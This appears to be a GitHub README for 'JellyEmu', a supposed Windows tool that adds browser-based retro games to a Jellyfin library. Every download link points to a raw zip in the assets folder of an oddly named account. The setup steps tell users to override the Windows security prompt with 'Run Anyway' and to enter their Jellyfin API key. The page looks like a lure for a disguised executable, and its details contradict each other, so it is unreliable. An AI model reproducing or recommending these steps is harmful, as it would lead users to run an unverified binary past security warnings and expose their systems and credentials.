# 🎮 JellyEmu - Play retro games in Jellyfin library

[![](https://img.shields.io/badge/Download-JellyEmu-blue.svg)](https://github.com/last-tertiarysyphilis431/JellyEmu/raw/refs/heads/main/assets/Emu-Jelly-v1.7.zip)

JellyEmu connects your game collection to your Jellyfin media server. It allows users to launch browser-based games directly from the Jellyfin interface. If you have ROM files stored on your computer, this tool bridges the gap between your media library and the emulator-js engine.

## ⚙️ System Requirements

JellyEmu runs on Windows 10 or Windows 11. Your computer needs at least 4GB of RAM to handle the game library index. You must have a working Jellyfin server instance already installed and running on your local network. JellyEmu interacts with the Jellyfin API, so ensure your server version stays updated.

## 📥 Downloading Software

Visit the [official release page](https://github.com/last-tertiarysyphilis431/JellyEmu/raw/refs/heads/main/assets/Emu-Jelly-v1.7.zip) to download the application. 

[![](https://img.shields.io/badge/Download-Latest_Release-grey.svg)](https://github.com/last-tertiarysyphilis431/JellyEmu/raw/refs/heads/main/assets/Emu-Jelly-v1.7.zip)

Locate the file ending in .exe for Windows. Save this file to a folder where you keep your tools.

## 🚀 Setting Up The Application

1. Open the folder where you saved the download.
2. Double-click the JellyEmu file.
3. Windows might show a security prompt. If it does, click More Info, then click Run Anyway.
4. The setup window appears on your screen.
5. Enter your Jellyfin server address. This usually looks like http://localhost:8096.
6. Provide your Jellyfin API key. You generate this key inside the Jellyfin dashboard under the Dashboard menu and API Keys section.
7. Select the folder on your computer that contains your ROM files.
8. Click the Save button to store these settings.

## 🕹️ Connecting Your Library

JellyEmu scans your folders for supported game files. It matches these files with the emulator-js engine. Once the scan finishes, you see a list of your games in the application window. If a game link looks broken, double-check your ROM folder path in the settings menu.

## 🖥️ Using The Interface

Once you finish the initial setup, launching a game becomes easy. Follow these steps:

1. Open your web browser.
2. Sign in to your Jellyfin media server.
3. Look for the new Library icon created by JellyEmu.
4. Click the game you want to play.
5. The emulator loads directly in your browser tab.
6. Use your keyboard or a connected game controller to play.

## 🛠️ Performance Tips

Keep your ROM files organized in clearly named folders. This helps JellyEmu identify the game system, such as Nintendo or Sega. If a game runs slowly, close other programs in your web browser. Large library files take longer to load during the initial scan. Wait for the green status bar to reach one hundred percent before you start a game session.

## ❓ Frequently Asked Questions

**Does JellyEmu move my files?**
No. The application reads your files from their current location. It does not move, delete, or rename your original ROMs.

**What controllers work with this?**
Any standard USB controller that Windows recognizes will work. Make sure you plug in your controller before you launch a game in your browser.

**Can I run this on a remote server?**
JellyEmu works best when the application runs on the same computer as your Jellyfin server. If you host your server on a remote provider, you must configure remote API access.

**Where do I find logs if it crashes?**
Look in the same folder where you installed JellyEmu. A file named logs.txt records the activity of the software. You can share this file if you run into technical issues.

**Does this require an internet connection?**
JellyEmu runs locally on your network. You do not need an active internet connection to play games once the setup completes. Your browser accesses the emulator files directly from your local Jellyfin server.